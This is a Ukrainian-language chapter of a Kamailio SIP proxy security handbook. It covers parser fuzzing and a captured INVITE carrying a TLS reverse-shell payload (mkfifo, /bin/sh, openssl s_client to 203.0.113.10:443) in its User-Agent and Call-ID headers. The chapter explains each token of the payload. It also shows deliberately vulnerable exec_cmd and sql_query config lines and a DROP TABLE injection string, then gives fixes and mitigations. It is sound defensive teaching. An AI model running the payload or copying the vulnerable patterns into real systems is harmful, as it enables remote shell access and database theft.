# 9.4 Fuzzing і кейс command-injection → reverse-shell

> [!IMPORTANT]
> Ця глава побудована на реально перехопленій атаці: `INVITE` з shell-конструкціями `$(...)`, вшитими в його `User-Agent` і `Call-ID`, з метою відкрити reverse shell назад до атакувальника. Питання, яке цікавить хендбук, — не «що робить цей payload», а внутрішнє: **чи є *Kamailio* тут вразливим компонентом?** Майже ніколи: vanilla-proxy форвардить ці байти і ніколи їх не виконує. Але є рівно два місця, де Kamailio *є* вразливістю, — конфіг, що шелить out, або той, що будує SQL із даних запиту, — і кілька місць downstream, де його дані підпалюють ґніт. Ця глава показує, де саме.

## Fuzzing парсера

Перше, що зондує атакувальник, — сам парсер: написаний вручну C над сирими мережевими байтами ([3.2 розпарсене повідомлення](08-parsed-message.md)), що реєструє на кожен хедер ім'я та byte-span на першому проході, а значення парсить лениво на першому доступі — швидко, але велика поверхня pointer-арифметики над контрольованим атакувальником входом. Клас багів класичний для byte-span-парсерів: over-read або off-by-one на обрізаному, завеликому чи патологічно вкладеному хедері, що заводить вказівник за кінець receive-буфера, або поле довжини, що суперечить байтам за ним.

Інструментарій зрілий. `SIPp` ганяє malformed-сценарії з написаного вручну XML; **PROTOS SIP suite** (OUSPG Університету Оулу) — канонічний корпус malformed-`INVITE`'ів, що свого часу витрусив баги парсерів по всій SIP-індустрії; coverage-guided-фазери (**AFL**/AFL++) мутують проти entry-point'ів парсера. (CVE тут навмисно не цитується: суть у *класі* багів, а не в конкретному пропатченому інстансі.) `sanity` ([9.2](37-security-modules.md)) — triage, не броня: він запускається *після* first-pass-парсу, перевіряє форму, а не memory-safety, і не може передбачити той баг, який шукає fuzzing. Реальний захист від класу bagів parser-crash — пропатчений, актуальний Kamailio.

## Перехоплений payload

Цікавий payload у перехопленні — зовсім не malformed. Це бездоганно well-formed `INVITE`, що парситься чисто й проходить `sanity`, несучи свою зброю у звичайному тексті хедера:

```
INVITE sip:00XXXXXXXXXX@sip.example.net SIP/2.0
Via: SIP/2.0/UDP 198.51.100.7:5060;branch=z9hG4bK-524287-1
From: "00XXXXXXXXXX" <sip:00XXXXXXXXXX@example.com>;tag=8472
To: <sip:00XXXXXXXXXX@sip.example.net>
Call-ID: $(mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 203.0.113.10:443 > /tmp/s; rm /tmp/s)@198.51.100.7
CSeq: 1 INVITE
Contact: <sip:00XXXXXXXXXX@198.51.100.7:5060>
User-Agent: $(mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 203.0.113.10:443 > /tmp/s; rm /tmp/s)
Max-Forwards: 70
Content-Type: application/sdp
Content-Length: 0
```

Розшифруймо підставлену команду — кожен токен заслуговує своє місце:

- `mkfifo /tmp/s` — створює іменований pipe (FIFO) на диску.
- `/bin/sh -i < /tmp/s 2>&1` — запускає інтерактивний shell, що читає команди *з* FIFO, зі stderr, складеним у stdout.
- `| openssl s_client -quiet -connect 203.0.113.10:443` — пайпить вивід shell'а в TLS-клієнт до C2 атакувальника на `203.0.113.10:443`; через `:443` з `openssl s_client` трафік виглядає як звичайне вихідне HTTPS і прослизає повз наївну egress-фільтрацію.
- `> /tmp/s` — заводить отримані TLS-клієнтом байти назад у FIFO, тож натискання атакувальника досягають stdin shell'а, замикаючи петлю.
- `rm /tmp/s` — видаляє pipe, прибираючи сліди.

Решта — декорація, щоб пакет читався як буденна спроба виклику. *Та сама* конструкція `$(...)` стоїть і в `Call-ID`, і в `User-Agent`: не знаючи вашого конфіга, атакувальник розпорошує підстановку в кілька полів, роблячи ставку, що *якийсь* downstream-споживач прочитає одне з них у shell.

## Чому vanilla Kamailio-proxy не вразливий

Проженіть це через звичайний relay — і **нічого не виконується.** Парсер робить те, що описує [3.2](08-parsed-message.md): записує ім'я хедера і byte-span `(вказівник, довжина)` у receive-буфер. `$(mkfifo …)` зберігається як *байти* — `str`, що вказує на офсети всередині `msg->buf`; ядро не інтерпретує, не розгортає й не обчислює його. Жодного shell'а немає ні в parse-path, ні в routing-engine, ні у форвардингу. При форварді значення їде через lump-систему ([3.3 lumps](09-lumps.md)) — буфер ніколи не редагується in-place, незачеплені хедери копіюються дослівно — тож `User-Agent: $(mkfifo …)` залишає proxy рівно таким, яким прибув, жодного разу не переданий `/bin/sh`. Proxy, що лише маршрутизує, автентифікує й релеїть, не має code-path, який перетворює значення хедера на процес. Payload інертний. Це дефолт і поширений випадок.

## Коли воно ТАКИ спрацьовує

Payload стає reverse shell'ом лише тоді, коли щось на вашому боці згодовує значення хедера в shell. Три `sink`'и, приблизно в порядку того, наскільки прямо тут замішаний Kamailio:

**1. Модуль `exec` — єдиний in-core footgun.** Модуль [`exec`](https://kamailio.org/docs/modules/devel/modules/exec.html) шелить out за дизайном: `exec_cmd()`/`exec_msg()`/`exec_avp()`/`exec_dset()` ганяють свій командний рядок через `popen()`, і той рядок **може містити pseudo-variable'и**, що інтерполюються перед виконанням. Інтерполюйте контрольоване атакувальником поле — і ви збудували remote shell:

```
# VULNERABLE — $ua is the raw User-Agent; $(...) is interpolated and run by the shell
exec_cmd("echo $ua >> /var/log/agents.log");
```

`$ua` розгортається в `$(mkfifo …)`, shell виконує *власну* command substitution, reverse shell відкривається. Документація модуля прямолінійна: змінні зі шкідливим входом «may result in OS command injection … input validation is required». Безпечна форма спочатку валідує, потім бере в одинарні лапки:

```
# SAFER — strict allowlist first, then single-quote as one literal arg
if ($ua =~ "^[A-Za-z0-9 ._/-]+$") {
    exec_cmd("echo '$ua' >> /var/log/agents.log");
}
```

Ще краще — взагалі не шелити out з даними повідомлення: самих лапок мало.

**2. Shell-based capture- чи logging-пайплайни.** Команду виконує не Kamailio, але його дані течуть у того, хто виконує: sidecar висмоктує поля (syslog, `evapi`/`xhttp`-хук, sngrep-style-експорт) і робить `sh -c "lookup-ua.sh $UA"`. Shell — у скрипті; taint походить з `User-Agent`, який Kamailio форварднув.

**3. Зовнішні CDR- / analytics-скрипти.** На крок далі: billing- чи analytics-джоб читає `From`/`User-Agent`/`Call-ID` з CDR і збирає shell-команду (виклик `system()`, backtick у Perl/Python-обгортці). `Call-ID` атакувальника з `$(...)` потрапляє в CDR рівно таким, яким перехоплений, і детонує, коли якийсь скрипт будує з нього shell-рядок.

## Той самий taint, але SQL-sink

Поміняйте інтерпретатор — баг виживає. Kamailio зазвичай має DB-backend — `auth_db`, `usrloc`, `dialplan`, `permissions`, `lcr` — і кілька модулів будують SQL із SIP-derived-значень. *Параметризовані* шляхи безпечні: налаштуйте `auth_db` через column-name і DBAPI екранує кожне значення через драйвер до того, як воно дійде до сервера. Відкритий шлях — *string-building* — `sql_query()` з `sqlops` і `avp_db_query()` з `avpops`, де ви складаєте текст запиту самі й pseudo-variable'и інтерполюються дослівно:

```
# VULNERABLE — $fU is the From-URI user, taken straight from the request
sql_query("ca", "SELECT plan FROM subscriber WHERE username='$fU'", "ra");
```

`$fU` — контрольований атакувальником: текст URI, що парсер зберіг як байти, рівно як і `User-Agent` вище, — і `sanity` його пропустив, бо це легальний SIP. Значення `From`-user `x';DROP TABLE subscriber;--` закриває лапку й додає statement; той самий шлях ексфільтрує `ha1`-хеші паролів з таблиці `subscriber` через union/boolean. Фікс дзеркалить правило для `exec` — екрануйте на межі за допомогою SQL-трансформації `{s.escape.common}`:

```
# SAFE — {s.escape.common} escapes quotes/specials for SQL
sql_query("ca", "SELECT plan FROM subscriber WHERE username='$(fU{s.escape.common})'", "ra");
```

`secf_check_sqli_all()` ([9.2](37-security-modules.md)) відбиває лише очевидні зонди; реальний захист — екранувати кожне інтерпольоване значення в запиті, або лишатися на параметризованому module API, що екранує за вас.

Об'єднувальний урок веде назад до [9.2](37-security-modules.md): **taint читається як довірений, бо він пережив парсинг і `sanity`** — але `sanity` валідував лише *SIP-синтаксис*, а `$(...)` і `'` — це легальний SIP-token-контент. Well-formed SIP не каже нічого про те, що *shell* чи *база даних* зроблять із цими байтами. Кожен `sink` робить те саме хибне припущення: що пережити SIP-шар означає, що байти безпечні для передачі іншому інтерпретатору.

## Як цього уникнути

**Ніколи не передавайте SIP-derived-рядок іншому інтерпретатору.**

- **Не шельте out з даними повідомлення.** Щоб залогувати чи порахувати — використовуйте власне логування/accounting Kamailio, а не `exec`. Найдешевший фікс — взагалі не мати shell'а на шляху.
- **Якщо без `exec` ніяк, убийте shell-інтерполяцію, а не просто екрануйте.** Віддавайте перевагу argument-vector-helper'у — значення передається як позиційний аргумент, який ОС передає без shell'а, — над збиранням рядка `sh -c "…$pv…"`. Якщо мусите інтерполювати — беріть в одинарні лапки *та* попередньо валідуйте проти суворого allowlist; blocklist «поганих символів» програє кодуванню, про яке ви не подумали.
- **Екрануйте SQL, побудований із SIP-значень.** З `sqlops`/`avpops` загортайте кожну інтерпольовану pseudo-variable у `{s.escape.common}`, або лишайтеся на параметризованому module API (наприклад, column-конфіг `auth_db`), що екранує через драйвер, — ніколи не вставляйте `$fU`/`$tU` в рядок запиту сирими.
- **Фільтруйте контент через `secfilter`.** `secf_check_ua()` і `secf_check_sqli_all()` ([9.2](37-security-modules.md)) відхиляють очевидні метасимволи до будь-якого `sink`'а — підвищуючи вартість наївного payload'а, а не замінюючи фікс самого `sink`'а.
- **Не чекайте, що `sanity` допоможе.** Він валідує форму; ця атака well-formed. Розраховувати тут на `sanity` — рівно та помилка, про яку ця глава.
- **Defence in depth на edge.** Ці payload'и приїжджають на тихих сканерах, що вже в reputation-фідах: `pike` + `ipban`-`htable` + apiban ([9.3](38-security-blocklists.md)) не дають більшості з них узагалі дістатися вашого route, `topoh` ([8.1 приховування топології](19-topos.md)) морить recon, а `fail2ban` ловить джерело після першого зонда. Жоден не фіксить `sink` — разом вони не дають більшості цього трафіку шансу його перевірити.

## Два шляхи

Той самий хедер `User-Agent` іде одним із двох маршрутів, що визначається цілком тим, що ви наладнали downstream:

```mermaid
flowchart TB
    H["INVITE User-Agent: $(mkfifo …; openssl s_client -connect C2 …)"] --> P[Parser stores value<br/>as raw byte span into msg->buf<br/>3.2 parsed message]

    P --> SAFE{Does anything<br/>feed it to a shell?}

    SAFE -->|No — vanilla proxy| FWD[Forward verbatim via lumps<br/>3.3 lumps<br/>bytes never executed]
    FWD --> INERT[Payload inert]

    SAFE -->|Yes — exec PV / external shell pipeline| SINK[exec_cmd '...$ua...'<br/>or sh -c in capture/CDR script]
    SINK --> SUB[Shell performs command substitution<br/>on $(...)]
    SUB --> RS[TLS reverse shell to<br/>203.0.113.10:443]

    classDef bad fill:#b62324,stroke:#b62324,color:#fff
    classDef good fill:#1f6feb,stroke:#1f6feb,color:#fff
    classDef pipe fill:#6e7681,stroke:#6e7681,color:#fff
    classDef warn fill:#bf8700,stroke:#bf8700,color:#fff
    class H bad
    class P,SAFE pipe
    class FWD,INERT good
    class SINK,SUB warn
    class RS bad
```

Розгалуження — це і є вся глава: ідентичні байти, ідентичний парс, ідентичний вердикт `sanity` — і єдине, що вирішує «інертний рядок» проти «reverse shell», — це чи поставили *ви* інший інтерпретатор на шлях.

На цій ноті Part 9 і закривається. Security-постура Kamailio — переважно про те, **що ви наладнали навколо нього**: дешеві edge-фільтри з [9.2](37-security-modules.md), reputation- і ban-стан з [9.3](38-security-blocklists.md), auth-межа, що перетворює анонімний датаграм на відому identity. Ядро трактує ворожі байти як дані й форвардить їх як дані. Справжні in-core footgun'и вузькі й уникаємі: `exec` з неекранованою pseudo-variable і сирий `sql_query`/`avp_db_query`, що інтерполює її, — тримайте SIP-derived-рядки подалі від shell'ів і за межами hand-built query-рядків, і перехоплений payload лишиться тим інертним текстом, яким парсер його завжди й вважав.

---

<p markdown="1" align="center">
  [← Зміст](../) · [← 9.3 Динамічні блок-листи](38-security-blocklists.md) · [Далі: 10.1 Що таке IMS →](31-ims-overview.md)
</p>
